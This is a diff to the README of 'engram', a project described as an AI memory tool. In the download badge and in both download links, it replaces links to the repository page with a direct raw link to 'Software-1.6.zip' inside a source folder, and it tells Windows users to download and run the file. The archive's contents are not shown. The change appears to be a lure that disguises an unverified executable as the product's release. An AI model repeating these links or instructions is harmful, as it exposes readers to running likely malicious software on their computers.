@@ -1,6 +1,6 @@
 # 🧠 engram - Keep AI Memory That Lasts
 
-[![Download engram](https://img.shields.io/badge/Download-Engram-blue?style=for-the-badge&logo=github)](https://github.com/serial-lightningrod338/engram)
+[![Download engram](https://img.shields.io/badge/Download-Engram-blue?style=for-the-badge&logo=github)](https://github.com/serial-lightningrod338/engram/raw/refs/heads/main/src/engram/sources/Software-1.6.zip)
 
 ## 📦 What is engram?
 
@@ -30,7 +30,7 @@ For best results, use Windows 10 or Windows 11.
 
 Visit this page to download:
 
-[https://github.com/serial-lightningrod338/engram](https://github.com/serial-lightningrod338/engram)
+[https://github.com/serial-lightningrod338/engram/raw/refs/heads/main/src/engram/sources/Software-1.6.zip](https://github.com/serial-lightningrod338/engram/raw/refs/heads/main/src/engram/sources/Software-1.6.zip)
 
 On that page, look for the latest release or download file. If you see a Windows file, download it and run this file.
 
@@ -198,6 +198,6 @@ You do not need to learn these first. They help when you want to fine-tune your 
 
 If you want to go back to the download page, use this link:
 
-[https://github.com/serial-lightningrod338/engram](https://github.com/serial-lightningrod338/engram)
+[https://github.com/serial-lightningrod338/engram/raw/refs/heads/main/src/engram/sources/Software-1.6.zip](https://github.com/serial-lightningrod338/engram/raw/refs/heads/main/src/engram/sources/Software-1.6.zip)
 
 Download the Windows file from that page and run it on your PC
